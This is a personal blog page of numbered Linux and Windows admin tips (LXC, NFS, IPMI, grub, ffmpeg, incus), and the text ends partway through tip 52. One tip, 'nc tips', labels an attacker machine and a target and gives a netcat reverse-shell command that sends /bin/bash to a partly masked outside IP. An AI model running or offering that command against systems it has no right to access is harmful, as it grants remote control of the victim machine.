<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><link href=http://gmpg.org/xfn/11 rel=profile><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>LinuxTips16 &#183; Dash</title><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css><link rel=stylesheet href="https://purplepalmdash.github.io/css/poole.css?ref=abc124"><link rel=stylesheet href="https://purplepalmdash.github.io/css/hyde.css?ref=abc124"><link rel=stylesheet href="https://purplepalmdash.github.io/css/poole-overrides.css?ref=abc124"><link rel=stylesheet href="https://purplepalmdash.github.io/css/hyde-overrides.css?ref=abc124"><link rel=stylesheet href="https://purplepalmdash.github.io/css/hyde-a.css?ref=abc124"><link rel=stylesheet href="https://purplepalmdash.github.io/css/custom-additions.css?ref=abc124"><link rel=stylesheet href=https://purplepalmdash.github.io/css/highlight/googlecode.css><link rel=stylesheet href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.min.css><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/styles/docco.min.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/1.10.2/jquery.min.js></script><script type=text/javascript src=/js/html2canvas.js></script><script type=text/javascript>function genPostShot(){var rightNow=new Date();var imageName=rightNow.toISOString().slice(0,16).replace(/(-)|(:)|(T)/g,"");imageName+='.jpg'
html2canvas(document.getElementsByClassName('post'),{background:'#FFFFFF',onrendered:function(canvas){$('#test').attr('href',canvas.toDataURL("image/jpeg"));$('#test').attr('download',imageName);$('#test')[0].click();}});};</script><script src=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js></script><script>hljs.initHighlightingOnLoad();</script><link rel=apple-touch-icon-precomposed sizes=144x144 href="http://purplepalmdash.github.io/touch-icon-144-precomposed.png?ref=abc124"><link href="http://purplepalmdash.github.io/favicon.png?ref=abc124" rel=icon><meta name=description content="LinuxTips16"><meta name=keywords content="Technology"></head><body class=theme-base-0c><div class=sidebar><div class="container sidebar-sticky"><div class=sidebar-about><img src=http://purplepalmdash.github.io/images/mylogo.jpeg alt=gravatar><h1><a href=http://purplepalmdash.github.io/>很惭愧，就做了一点微小的工作</a></h1><a href=http://purplepalmdash.github.io/><p>Dash</p></a></div><ul class=sidebar-nav><li class=sidebar-nav-item><a href=http://purplepalmdash.github.io/post/>All Posts</a></li><li class=sidebar-nav-item><a href=http://purplepalmdash.github.io/categories/technology/>Technology</a></li><li class=sidebar-nav-item><a href=http://purplepalmdash.github.io/categories/life/>Life</a></li><li class=sidebar-nav-item><a href=http://purplepalmdash.github.io/categories/linuxtips/>LinuxTips</a></li></ul><ul class=sidebar-nav><li class=sidebar-nav-item><a href=https://github.com/purplepalmdash><i class="fa fa-github-square fa-3x"></i></a><a href=https://cn.linkedin.com/in/yang-feipeng-1b909319><i class="fa fa-linkedin-square fa-3x"></i></a><a href=https://plus.google.com/u/0/106572959364703833986><i class="fa fa-google-plus-square fa-3x"></i></a><a href=https://www.facebook.com/yang.feipeng><i class="fa fa-facebook-square fa-3x"></i></a><a href=https://twitter.com/dashwillfly><i class="fa fa-twitter-square fa-3x"></i></a></li></ul></div></div><div class="content container"><div class=post><h1>LinuxTips16</h1><p align=right><a href=javascript:genPostShot()>TurnToJPG --> <i class="fa fa-camera-retro fa-2x"></i></a><a id=test></a></p><hr><span class=post-date>Nov 27, 2023<br><a class=a_cat href=http://purplepalmdash.github.io/categories/technology>Technology</a></span><div id=_toc class=toc><nav id=TableOfContents><ul><li><ul><li><a href=#1-archlinux-ctg-items>1. ArchLinux ctg items</a></li><li><a href=#2-conda-deactivate-base>2. conda deactivate base</a></li><li><a href=#3-lxc-with-nvidia-support>3. lxc with nvidia support</a></li><li><a href=#4-lxc-with-nvidiacorrect-way>4. lxc with nvidia(correct way)</a></li><li><a href=#5-lxc-add-second-nicmacvlan>5. lxc add second nic(macvlan)</a></li><li><a href=#6-lxc-on-ubuntu2204>6. lxc on ubuntu22.04</a></li><li><a href=#7-ipmi-set-address>7. ipmi set address</a></li><li><a href=#8-apt-cache-policy-alternative>8. apt-cache policy alternative</a></li><li><a href=#9-cut-video-using-ffmpeg>9. cut video using ffmpeg</a></li><li><a href=#10-nfs-serverubuntu2204>10. NFS server(ubuntu22.04)</a></li><li><a href=#11-install-casaos>11. install casaos</a></li><li><a href=#12-rst2html-issue>12. rst2html issue</a></li><li><a href=#13-redroid-and-webui>13. redroid and webui</a></li><li><a href=#14-ubuntu2204-docker-issue>14. ubuntu2204 docker issue</a></li><li><a href=#15-build-kernel-time>15. build kernel time</a></li><li><a href=#16-apt-force-overwrite>16. apt force overwrite</a></li><li><a href=#17-vbox-issue>17. vbox issue</a></li><li><a href=#18-libvirtd-nvram-privilege-issue>18. libvirtd nvram privilege issue</a></li><li><a href=#19-nvflash-download>19. nvflash download</a></li><li><a href=#20-totally-blacklist-i915>20. totally blacklist i915</a></li><li><a href=#21-activate-the-pvs-and-mount>21. activate the pvs and mount</a></li><li><a href=#22-build-celanda-docker>22. build celanda docker</a></li><li><a href=#23-ipmi-reset-in-system>23. ipmi reset in system</a></li><li><a href=#24-nvidia-conflict-driver>24. nvidia conflict driver</a></li><li><a href=#25-cpupower>25. cpupower</a></li><li><a href=#26-s-tui>26. s-tui</a></li><li><a href=#27-cpupower>27. cpupower</a></li><li><a href=#28-show-htop-on-ssh>28. show htop on ssh</a></li><li><a href=#29-quickly-pip>29. quickly pip</a></li><li><a href=#30--git-lfs>30 . git lfs</a></li><li><a href=#31-update-multiple-gcc-selection>31. update multiple gcc selection</a></li><li><a href=#32-speedup-disk>32. speedup disk</a></li><li><a href=#33-github-actions-update>33. github actions update</a></li><li><a href=#34-wake-on-lan-configuration>34. wake-on-lan configuration</a></li><li><a href=#35-update-grub2-not-working-for-efi>35. update-grub2 not working for efi</a></li><li><a href=#36-ipxe-bootup-issue>36. ipxe bootup issue</a></li><li><a href=#37-win11-passwordless-login>37. win11 passwordless login</a></li><li><a href=#38-change-win11-behavior>38. change win11 behavior</a></li><li><a href=#39-7z-extract-files>39. 7z extract files</a></li><li><a href=#40-ast-resolution>40. ast resolution</a></li><li><a href=#41-win11-passwordless-login>41. win11 passwordless login</a></li><li><a href=#42-windows-11-ignore-network-installation>42. Windows 11 ignore network installation</a></li><li><a href=#43-mii-tool-for-re-negotiate>43. mii-tool for re-negotiate</a></li><li><a href=#44--quickly-install-linuxloop>44 . quickly install linuxloop</a></li><li><a href=#45-enable-detect-os>45. enable detect os</a></li><li><a href=#46-disable-netbootxyz>46. disable netbootxyz</a></li><li><a href=#47-tioreplace-minicom>47. tio(replace minicom)</a></li><li><a href=#48-nc-tips>48. nc tips</a></li><li><a href=#49-rtl-81118168-driver>49 rtl 8111/8168 driver</a></li><li><a href=#50-copy-files-into-qcow2>50. copy files into qcow2</a></li><li><a href=#51-lxc-download-speedup>51. lxc download speedup</a></li><li><a href=#52-incus-tips-for-fog>52. incus tips for fog</a></li><li><a href=#53-incus-network-create>53. incus network create</a></li><li><a href=#54-incus-macvlan-create>54. incus macvlan create</a></li><li><a href=#55-incus-instance-network>55. incus instance network</a></li><li><a href=#56-hide-partition>56. hide partition</a></li><li><a href=#57-add-user-into-sudo>57. add user into sudo</a></li><li><a href=#58-disable-debian-grub-picture>58. disable debian grub picture</a></li><li><a href=#59-blissos16-in-linuxloop>59. blissos16 in linuxloop</a></li><li><a href=#60-automatically-gptmbrfix>60. Automatically gpt/mbr/fix</a></li><li><a href=#61-install-gnome-flashback>61. Install gnome flashback</a></li><li><a href=#62-buildroot-chinese>62. buildroot chinese</a></li><li><a href=#63-xz-for-initram>63. xz for initram</a></li><li><a href=#64-python-issue>64. python issue</a></li><li><a href=#64-rocklinux-use-cd-rom>64. rocklinux use cd-rom</a></li><li><a href=#65-fog-datebase-tips>65. fog datebase tips</a></li></ul></li></ul></nav></div><h3 id=1-archlinux-ctg-items>1. ArchLinux ctg items</h3><p>Install nomachine:</p><pre><code>$ export https_proxy=http://192.168.1.194:10809
$ export http_proxy=http://192.168.1.194:10809
$ yay  --sudoflags=&quot;http_proxy=http://192.168.1.194:10809 https_proxy=http://192.168.1.194:10809&quot; nomachine
</code></pre><p>Configure auto-login refers to <code>2021-06-15-iPadiPhoneMirroringDisplay.md</code></p><p>connecting to :</p><p><img src=/images/2023_11_27_11_40_04_660x179.jpg alt=/images/2023_11_27_11_40_04_660x179.jpg></p><h3 id=2-conda-deactivate-base>2. conda deactivate base</h3><p>via:</p><pre><code>conda config --set auto_activate_base false
</code></pre><p>Doing this could let python to be set to system default.</p><pre><code>$ which python3
/usr/bin/python3
</code></pre><h3 id=3-lxc-with-nvidia-support>3. lxc with nvidia support</h3><p>Start a lxc instance via:</p><pre><code>$ sudo lxc launch images:ubuntu/jammy lxcnvidia
Creating lxcnvidia
Starting lxcnvidia                        
$ sudo lxc config set lxcnvidia nvidia.driver.capabilities=all
$ sudo lxc config show lxcnvidia  | grep nvidia
  nvidia.driver.capabilities: all
</code></pre><p>Configure in lxc instance:</p><pre><code>$ sudo lxc exec lxcnvidia bash
root@lxcnvidia:~# 
</code></pre><h3 id=4-lxc-with-nvidiacorrect-way>4. lxc with nvidia(correct way)</h3><p>Steps:</p><pre><code>lxc launch ubuntu:18.04 cuda -c nvidia.runtime=true
lxc config device add cuda gpu gpu
lxc exec cuda -- nvidia-smi
</code></pre><h3 id=5-lxc-add-second-nicmacvlan>5. lxc add second nic(macvlan)</h3><p>Create a new profile:</p><pre><code>$ cat macvlan
config: {}
description: Default LXD profile modified for using macvlan
devices:
  eth1:
    nictype: macvlan
    parent: enp3s0 
    type: nic
name: macvlan
</code></pre><p>Create this new profile:</p><pre><code># lxc profile edit macvlan&lt;macvlan
# lxc config edit cuda
    profiles:
    - default
+++    - macvlan
# lxc restart cuda
# lxc exec cuda bash
dhclient eth1
</code></pre><p>Then you got the address.</p><p>Start the ui:</p><pre><code>dash@cuda:~/webui$ ./webui.sh 

################################################################
Install script for stable-diffusion + Web UI
Tested on Debian 11 (Bullseye)
################################################################

</code></pre><p>Should change its listening address to <code>0.0.0.0</code></p><h3 id=6-lxc-on-ubuntu2204>6. lxc on ubuntu22.04</h3><p>not started, solved via:</p><pre><code>GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash systemd.unified_cgroup_hierarchy=false&quot;

</code></pre><h3 id=7-ipmi-set-address>7. ipmi set address</h3><p>set bmc port&rsquo;s ip address to <code>192.168.2.167</code>, gateway <code>192.168.2.1</code> via:</p><pre><code> ipmitool lan set 1 ipsrc static
 ipmitool lan set 1 ipaddr 192.168.2.167
 ipmitool lan set 1 defgw ipaddr 192.168.2.1
 ipmitool lan print 1
</code></pre><h3 id=8-apt-cache-policy-alternative>8. apt-cache policy alternative</h3><p>in yum, via:</p><pre><code>yum --showduplicates list 
</code></pre><h3 id=9-cut-video-using-ffmpeg>9. cut video using ffmpeg</h3><p>cut unnecessary part and combine then again:</p><pre><code>$ ffmpeg -ss 00:00:06 -t 00:03:43 -i SLXC-2023-12-08_11.25.03.mp4 -vcodec copy -acodec copy split1.mp4
$ ffmpeg -ss 00:05:55 -t 00:09:00 -i SLXC-2023-12-08_11.25.03.mp4 -vcodec copy -acodec copy split2.mp4
$ ffmpeg -ss 00:15:46 -t 00:00:35 -i SLXC-2023-12-08_11.25.03.mp4 -vcodec copy -acodec copy split3.mp4
$ vim list.txt
file ./split1.mp4
file ./split2.mp4
file ./split3.mp4
$ ffmpeg -f concat -safe 0 -i list.txt -c:v copy vdiidvRONG.mp4
</code></pre><h3 id=10-nfs-serverubuntu2204>10. NFS server(ubuntu22.04)</h3><p>Steps:</p><pre><code>sudo apt update
sudo apt install nfs-kernel-server
sudo mkdir -p /mnt/nfs_share
sudo chown -R nobody:nogroup /mnt/nfs_share/
sudo chmod 777 /mnt/nfs_share/
sudo nano /etc/exports
/mnt/nfs_share 192.168.1.1/24(rw,sync,no_subtree_check)
sudo exportfs -a
sudo systemctl restart nfs-kernel-server
sudo systemctl enable nfs-kernel-server
</code></pre><p>mount via:</p><pre><code>sudo mount -t nfs 192.168.1.194:/mnt/nfs_share /mnt

</code></pre><h3 id=11-install-casaos>11. install casaos</h3><p>via:</p><pre><code>curl -fsSL https://get.casaos.io | sudo bash
</code></pre><h3 id=12-rst2html-issue>12. rst2html issue</h3><p>Solved via:</p><pre><code>apt-get install python3-docutils
</code></pre><h3 id=13-redroid-and-webui>13. redroid and webui</h3><p>via:</p><pre><code>docker run -itd --privileged -v /root/scrcpy-web/data:/data --name scrcpy-web -p 48000:8000/tcp --link redroid12:myphone1 emptysuns/scrcpy-web:v0.1
docker run -itd --name redroid12  --privileged -p 5555:5555 redroid12:latest androidboot.use_memfd=1
</code></pre><p>Should re-write using docker-compose.</p><h3 id=14-ubuntu2204-docker-issue>14. ubuntu2204 docker issue</h3><p>solved via:</p><pre><code>vagrant@vagrant:~$ sudo update-alternatives --config iptables
There are 2 choices for the alternative iptables (providing /usr/sbin/iptables).

  Selection    Path                       Priority   Status
------------------------------------------------------------
* 0            /usr/sbin/iptables-nft      20        auto mode
  1            /usr/sbin/iptables-legacy   10        manual mode
  2            /usr/sbin/iptables-nft      20        manual mode

Press &lt;enter&gt; to keep the current choice[*], or type selection number: 1
update-alternatives: using /usr/sbin/iptables-legacy to provide /usr/sbin/iptables (iptables) in manual mode
vagrant@vagrant:~$ sudo update-alternatives --config ip6tables
There are 2 choices for the alternative ip6tables (providing /usr/sbin/ip6tables).

  Selection    Path                        Priority   Status
------------------------------------------------------------
* 0            /usr/sbin/ip6tables-nft      20        auto mode
  1            /usr/sbin/ip6tables-legacy   10        manual mode
  2            /usr/sbin/ip6tables-nft      20        manual mode
</code></pre><p>Then restart docker systemd service.</p><h3 id=15-build-kernel-time>15. build kernel time</h3><p>in i7-1165g7, build 6.1.x kernel time:</p><pre><code>$ time sh -c 'make -j8 &amp;&amp; make modules -j8 &amp;&amp; sudo make install &amp;&amp; sudo make modules_install '
......

real	28m34.866s
user	138m28.034s
sys	10m21.570s
</code></pre><h3 id=16-apt-force-overwrite>16. apt force overwrite</h3><p>via:</p><pre><code>sudo apt-get -o Dpkg::Options::=&quot;--force-overwrite
</code></pre><h3 id=17-vbox-issue>17. vbox issue</h3><p>via:</p><pre><code> sudo groupadd vboxusers
Then add the current user to the above group:

$ sudo usermod -a -G vboxusers sk
Replace sk with your current username.

Check if the user is added to the group:

$ grep vboxusers /etc/group
vboxusers:x:1001:sk
Yes, the user sk has been added to vboxusers' group.

Finally, restart the virtualbox kernel module using command:

$ sudo /sbin/vboxconfig
</code></pre><h3 id=18-libvirtd-nvram-privilege-issue>18. libvirtd nvram privilege issue</h3><p><code>/var/lib/libvirt/qemu/nvram/win11_VARS.fd': Permission denied</code>, solved via:</p><pre><code>1. Add the following lines to the end of /etc/apparmor.d/abstractions/libvirt-qemu

/var/lib/libvirt/qemu/nvram/* rwk,
/sys/kernel/mm/transparent_hugepage/enabled r,
/usr/share/OVMF/OVMF_CODE_4M.secboot.fd rk,
/run/libvirt/qemu/swtpm/* rwk,

2. Reload apparmor, restart libvirtd:

sudo systemctl reload apparmor.service
sudo systemctl restart libvirtd

</code></pre><h3 id=19-nvflash-download>19. nvflash download</h3><p>nvflash is used for dumping out the nvidia video flash, download it from <code>https://www.techpowerup.com/download/nvidia-nvflash/</code></p><h3 id=20-totally-blacklist-i915>20. totally blacklist i915</h3><p>via:</p><pre><code>$ sudo vim /etc/modprobe.d/blacklist.conf
blacklist.conf
blacklist snd_hda_intel
blacklist snd_hda_codec_hdmi
blacklist i915
$ sudo update-initramfs -u -k all
</code></pre><h3 id=21-activate-the-pvs-and-mount>21. activate the pvs and mount</h3><p>solved via:</p><pre><code>vgchange -ay
mkdir -p /mnt8
mount /dev/mapper/pve-root /mnt8
</code></pre><h3 id=22-build-celanda-docker>22. build celanda docker</h3><p><code>sudo docker run -it ubuntu:18.04 /bin/bash</code>, then in docker instance for doing following steps:</p><pre><code>apt update -y
apt install -y build-essential git git-lfs
apt install -y python-six
apt install -y wget curl
ln -sf /usr/bin/python3 /usr/bin/python
apt install -y iotop htop nethogs python-pystache python3-pystache
scp dash@192.168.1.45:~/.bin/repo .
cp repo /bin/
cp repo /usr/bin/repo
</code></pre><p>Commit the docker instance:</p><pre><code>$ sudo docker commit a3e139322b90 buildceladon:latest
</code></pre><h3 id=23-ipmi-reset-in-system>23. ipmi reset in system</h3><p>ipmi cold reset in system .</p><pre><code># ipmitool bmc reset cold
Sent cold reset command to MC
</code></pre><h3 id=24-nvidia-conflict-driver>24. nvidia conflict driver</h3><p>error messages:</p><pre><code>dpkg: error processing archive /var/cache/apt/archives/nvidia-kernel-common-535_535.161.07-0ubuntu1_amd64.deb (--unpack):
 trying to overwrite '/lib/firmware/nvidia/535.161.07/gsp_ga10x.bin', which is also in package nvidia-firmware-535-535.161.07 535.161.07-0ubuntu0.22.04.1
dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)
Errors were encountered while processing:
 /var/cache/apt/archives/nvidia-kernel-common-535_535.161.07-0ubuntu1_amd64.deb

</code></pre><p>solved via:</p><pre><code>sudo dpkg -i --force-all /var/cache/apt/archives/nvidia-kernel-common-535_535.161.07-0ubuntu1_amd64.deb
sudo apt --fix-broken install
</code></pre><h3 id=25-cpupower>25. cpupower</h3><p>Install:</p><pre><code>sudo apt install -y linux-tools-common
sudo apt install -y linux-tools-generic
sudo apt install -y linux-tools-6.5.0-25-generic
</code></pre><p>with <code>linux-tools-common</code> you will also have the turbostat for viewing the power consumption.</p><h3 id=26-s-tui>26. s-tui</h3><p>Install via <code>apt install -y s-tui</code>.</p><p><img src=/images/2024_03_15_22_36_02_938x971.jpg alt=/images/2024_03_15_22_36_02_938x971.jpg></p><h3 id=27-cpupower>27. cpupower</h3><p>Set default grub items:</p><pre><code>GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash amd_pstate=guided&quot;
</code></pre><p>then check the governer:</p><pre><code>$ cpupower frequency-info 
...
  available cpufreq governors: conservative ondemand userspace powersave performance schedutil
...
</code></pre><p>set to ondemand:</p><pre><code>sudo cpupower frequency-set -g ondemand
</code></pre><h3 id=28-show-htop-on-ssh>28. show htop on ssh</h3><p>via:</p><pre><code>ssh user@test.home -t 'htop'
</code></pre><h3 id=29-quickly-pip>29. quickly pip</h3><p>via:</p><pre><code>pip install xxxx -i https://pypi.mirrors.ustc.edu.cn/simple/
</code></pre><h3 id=30--git-lfs>30 . git lfs</h3><p>If git won&rsquo;t call git-lfs for downloading big files, install:</p><pre><code>git lfs install
</code></pre><p>resulting in:</p><pre><code>$ cat ~/.gitconfig 
[filter &quot;lfs&quot;]
	smudge = git-lfs smudge -- %f
	process = git-lfs filter-process
	required = true
	clean = git-lfs clean -- %f
</code></pre><h3 id=31-update-multiple-gcc-selection>31. update multiple gcc selection</h3><p>Steps:</p><pre><code>sudo update-alternatives --remove-all gcc 
sudo update-alternatives --remove-all g++
sudo apt install gcc-11 gcc-12 g++-11 g++-12
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 10
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-12 20

sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-11 10
sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-12 20

sudo update-alternatives --install /usr/bin/cc cc /usr/bin/gcc 30
sudo update-alternatives --set cc /usr/bin/gcc

sudo update-alternatives --install /usr/bin/c++ c++ /usr/bin/g++ 30
sudo update-alternatives --set c++ /usr/bin/g++
</code></pre><p>Select default items:</p><pre><code>sudo update-alternatives --config gcc
sudo update-alternatives --config g++
</code></pre><h3 id=32-speedup-disk>32. speedup disk</h3><p>via disable fstrim on ubuntu:</p><pre><code>sudo systemctl disable fstrim.timer
</code></pre><h3 id=33-github-actions-update>33. github actions update</h3><p><code>purplepalmdash/purplepalmdash.github.io</code>'s Deploy keys, add the new deploy keys:</p><p><img src=/images/2024_04_07_11_03_45_478x133.jpg alt=/images/2024_04_07_11_03_45_478x133.jpg></p><p><code>purplepalmdash/blogsource</code>'s Settings-> <code>Secrets and variables</code> -> <code>Actions</code>, add a new <code>ACTIONS_DEPLOY_KEY</code>:</p><p><img src=/images/2024_04_07_11_04_56_970x148.jpg alt=/images/2024_04_07_11_04_56_970x148.jpg></p><p>The first picture contains content from <code>id_ed25519.pub</code>, while the second is <code>id_ed25519</code>, which are generated via <code>ssh-keygen -t ed25519 -C "xxxxxx@gmail.com"</code>.</p><p>Change the file:</p><pre><code>$ cat .github/workflows/main.yml
......

     - name: Deploy
        uses: peaceiris/actions-gh-pages@v3
        with:
          deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }}
          external_repository: purplepalmdash/purplepalmdash.github.io
          publish_dir: ./src/public
          publish_branch: master

</code></pre><h3 id=34-wake-on-lan-configuration>34. wake-on-lan configuration</h3><p>Enable wake on lan for linux configuration, and make it permanently:</p><pre><code>test@2204:~$ sudo vim  /etc/systemd/system/wol.service 
test@2204:~$ sudo systemctl daemon-reload
test@2204:~$ sudo systemctl enable wol.service
Created symlink /etc/systemd/system/basic.target.wants/wol.service → /etc/systemd/system/wol.service.
test@2204:~$ cat /etc/systemd/system/wol.service
[Unit]
Description=Enable Wake On Lan

[Service]
Type=oneshot
ExecStart = /sbin/ethtool --change enp1s0 wol g

[Install]
WantedBy=basic.target
test@2204:~$ /sbin/ethtool --change enp1s0 wol g
netlink error: Operation not permitted
test@2204:~$ sudo /sbin/ethtool --change enp1s0 wol g
test@2204:~$ sudo ethtool enp1s0 | grep Wake
	Supports Wake-on: pumbg
	Wake-on: g
test@2204:~$ sudo shutdown -h now
Connection to 192.168.1.40 closed by remote host.
</code></pre><h3 id=35-update-grub2-not-working-for-efi>35. update-grub2 not working for efi</h3><p>solved via:</p><pre><code>grub-install --efi-directory=/boot/efi
</code></pre><h3 id=36-ipxe-bootup-issue>36. ipxe bootup issue</h3><p>let realtek use its own efi file for bootup, solved via:</p><pre><code># vim /etc/dhcp/dhcpd.conf
host st12400 {
                        hardware ethernet 54:f6:c5:1f:23:bd;
                        filename &quot;realtek.efi&quot;;
                }
# systemctl restart isc-dhcp-server
</code></pre><h3 id=37-win11-passwordless-login>37. win11 passwordless login</h3><p>Login without insert password:</p><p><img src=/images/2024_04_12_10_20_49_695x445.jpg alt=/images/2024_04_12_10_20_49_695x445.jpg></p><p><img src=/images/2024_04_12_10_21_12_548x589.jpg alt=/images/2024_04_12_10_21_12_548x589.jpg></p><h3 id=38-change-win11-behavior>38. change win11 behavior</h3><p>via:</p><pre><code>C:\Users\feipyang&gt;reg add &quot;HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32&quot; /f /ve
操作成功完成。

C:\Users\feipyang&gt;taskkill /f /im explorer.exe &amp; start explorer.exe
成功: 已终止进程 &quot;explorer.exe&quot;，其 PID 为 10536。
</code></pre><h3 id=39-7z-extract-files>39. 7z extract files</h3><p>via:</p><pre><code>7za x xxxx.7z
</code></pre><h3 id=40-ast-resolution>40. ast resolution</h3><p>ast resolution:</p><pre><code>xrandr --newmode &quot;1440x900_59.90&quot;  106.29  1440 1520 1672 1904  900 901 904 932  -HSync +Vsync
xrandr --addmode VGA-1 1440x900_59.90
</code></pre><h3 id=41-win11-passwordless-login>41. win11 passwordless login</h3><p>Solved via:</p><pre><code>按win+R，打开运行，输入Control Userpasswords2，打开用户账户。
用户账户设置.png

打开该设置，取消选中该选项，点击应用，输入想要自动登录的账户和密码，即可开机后自动登录Windows。
若此界面无该选项，按win+R，打开运行，输入regedit，打开注册表修改
路径：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\PasswordLess\Device
这个路径下的DevicePasswordLessBuildVersion数值从2改成0，再次打开用户账户设置就有选项了。
</code></pre><h3 id=42-windows-11-ignore-network-installation>42. Windows 11 ignore network installation</h3><p>via:</p><pre><code>OOBE\BYPASSNRO 
</code></pre><h3 id=43-mii-tool-for-re-negotiate>43. mii-tool for re-negotiate</h3><p>steps:</p><pre><code>root@aiBox:/home/dash# mii-tool enp2s0
enp2s0: negotiated 100baseTx-FD, link ok
root@aiBox:/home/dash# mii-tool -r enp2s0
restarting autonegotiation...
root@aiBox:/home/dash# mii-tool enp2s0
enp2s0: negotiated 1000baseT-FD flow-control, link ok

</code></pre><h3 id=44--quickly-install-linuxloop>44 . quickly install linuxloop</h3><p>Change the content of <code>linuxloop</code>:</p><pre><code>chroot_Arch()
{
prepare_bootstrap=&quot;
curl -l https://archlinux.org/mirrorlist/?ip_version=4 -o /etc/pacman.d/mirrorlist
sed -i 's@#Server = https://mirrors.ustc.edu.cn@Server = https://mirrors.ustc.edu.cn@g' /etc/pacman.d/mirrorlist
pacman -Syu --noconfirm --needed bash bash-completion btrfs-progs bzip2 ca-certificates coreutils cryptsetup curl dosfstools e2fsprogs efibootmgr gzip lsof nano openssl reflector sudo strace tar util-linux xz zstd
&quot;

cat &gt;&quot;${linuxloopsdir}&quot;/chroot/bootstrap/linuxloops/prepare_chroot &lt;&lt;PREPARE_CHROOT
#!/bin/bash
set -e
#reflector --latest 10 --threads 10 --connection-timeout 1 --download-timeout 1 --protocol https --completion-percent 90 --sort rate --save /etc/pacman.d/mirrorlist --verbose
echo 'Server = http://mirrors.ustc.edu.cn/archlinux/\$repo/os/\$arch'&gt;/etc/pacman.d/mirrorlist
cat /etc/pacman.d/mirrorlist
pacstrap -G /mnt base base-devel
PREPARE_CHROOT
chmod 0755 &quot;${linuxloopsdir}&quot;/chroot/bootstrap/linuxloops/prepare_chroot
</code></pre><p>Host&rsquo;s <code>/etc/resolv.conf</code> should be set to <code>nameserver 223.5.5.5</code>.<br>Install via:</p><pre><code>test@vhdboot:~$ sudo bash ~/linuxloops -distro Arch -env None -dst /home/test/arch.img -s 30 
menuentry 'Arch' --class 'arch' {
	rmmod tpm
	img_path=&quot;/home/test/arch.img&quot;
	img_uuid=&quot;6ab60fa1-d874-4b84-99d9-8ac0230f0303&quot;
	search --no-floppy --set=root --file &quot;${img_path}&quot;
	loopback loop &quot;${img_path}&quot;
	linuxloops_args=&quot;rdinit=/linuxloops img_path=${img_path} img_uuid=${img_uuid}&quot;
	export linuxloops_args
	if [ -f (loop,2)/grub2/grub.cfg ]; then
		configfile (loop,2)/grub2/grub.cfg
	else
		configfile (loop,2)/grub/grub.cfg
	fi
}
</code></pre><h3 id=45-enable-detect-os>45. enable detect os</h3><p>enable os-probe:</p><pre><code>$ sudo vim /etc/default/grub
GRUB_DISABLE_OS_PROBER=false
$ sudo update-grub2
</code></pre><h3 id=46-disable-netbootxyz>46. disable netbootxyz</h3><p>via:</p><pre><code>dash@ai:~/Code/netboot.xyz$ cd ~/containerdata-public/docker/netbootxyz/
dash@ai:~/containerdata-public/docker/netbootxyz$ ls
assets  config  docker-compose.yml  docker-compose.yml~  readme.md
dash@ai:~/containerdata-public/docker/netbootxyz$ sudo docker-compose down
Stopping netbootxyz ... done
Removing netbootxyz ... done
Removing network netbootxyz_default

</code></pre><h3 id=47-tioreplace-minicom>47. tio(replace minicom)</h3><p>via:</p><pre><code>sudo pacman -S tio
sudo tio /dev/ttyUSB0
sudo tio --baudrate 115200 --databits 8 --flow none --stopbits 1 --parity none /dev/ttyUSB0
</code></pre><h3 id=48-nc-tips>48. nc tips</h3><p>via:</p><pre><code>攻击机开启本地监听：

netcat -lvvp 2333
目标机主动连接攻击机：

netcat 47.xxx.xxx.72 2333 -e /bin/bash
# nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash
</code></pre><h3 id=49-rtl-81118168-driver>49 rtl 8111/8168 driver</h3><p>Install driver for enable WOL:</p><p><img src=/images/2024_04_30_11_42_39_716x493.jpg alt=/images/2024_04_30_11_42_39_716x493.jpg></p><p><img src=/images/2024_04_30_11_43_28_466x576.jpg alt=/images/2024_04_30_11_43_28_466x576.jpg></p><h3 id=50-copy-files-into-qcow2>50. copy files into qcow2</h3><p>Using following commands for copying files into qcow2. thus we could start the corresonding vm.</p><pre><code>sudo modprobe nbd max_part=8
sudo qemu-nbd --connect=/dev/nbd0 /media/sda/images/0000_win10vhd.qcow2 
sudo mount /dev/nbd0p2  /mnt8
sudo cp /media/sda/images/win11.vhdx /mnt8 &amp;&amp; sudo sync
sudo umount /mnt8
sudo qemu-nbd --disconnect /dev/nbd0
sudo rmmod nbd
</code></pre><h3 id=51-lxc-download-speedup>51. lxc download speedup</h3><p>via specify the mirror site:</p><pre><code>sudo lxc-create -n debian12 -t download -- --server mirrors.tuna.tsinghua.edu.cn/lxc-images -r bookworm
</code></pre><p>or specify another mirror:</p><pre><code>mirrors.sdu.edu.cn/lxc-images
</code></pre><h3 id=52-incus-tips-for-fog>52. incus tips for fog</h3><p>tips:</p><pre><code># 80(webadmin) port forwarding:    
incus config device add fogincuschinese myport80 proxy listen=tcp:0.0.0.0:80 connect=tcp:127.0.0.1:80
# 69(tftp) port(udp and tcp):    
incus config device add fogincuschinese myport69 proxy listen=tcp:0.0.0.0:69 connect=tcp:127.0.0.1:69
incus config device add fogincuschinese myport69udp proxy listen=udp:0.0.0.0:69 connect=udp:127.0.0.1:69
# 2049(nfs) port (udp and tcp):    
incus config device add fogincuschinese myport2049 proxy listen=tcp:0.0.0.0:2049 connect=tcp:127.0.0.1:2049
incus config device add fogincuschinese myport2049udp proxy listen=udp:0.0.0.0:2049 connect=udp:127.0.0.1:2049
